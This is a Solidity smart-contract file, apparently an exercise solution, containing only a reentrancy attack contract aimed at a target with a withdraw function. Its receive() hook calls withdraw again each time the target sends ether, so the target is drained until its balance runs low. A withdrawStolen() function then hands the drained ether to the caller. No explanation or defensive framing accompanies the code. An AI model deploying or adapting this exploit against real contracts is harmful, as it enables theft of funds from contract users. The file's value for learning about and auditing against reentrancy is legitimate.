// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

interface IOptimizedSecurity101 {
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttack {
    IOptimizedSecurity101 public target;
    uint256 public withdrawAmount;
    
    constructor(address _target) {
        target = IOptimizedSecurity101(_target);
    }
    
    // Function to start the attack
    function attack(uint256 _withdrawAmount) external payable {
        withdrawAmount = _withdrawAmount;
        // Send some ether to the target contract first
        payable(address(target)).transfer(msg.value);
        // Start the reentrancy attack
        target.withdraw(_withdrawAmount);
    }
    
    // This function will be called when the target contract sends ether
    receive() external payable {
        // Check if target still has balance to avoid infinite recursion
        if (address(target).balance >= withdrawAmount) {
            target.withdraw(withdrawAmount);
        }
    }
    
    // Function to withdraw stolen funds
    function withdrawStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // Function to check contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}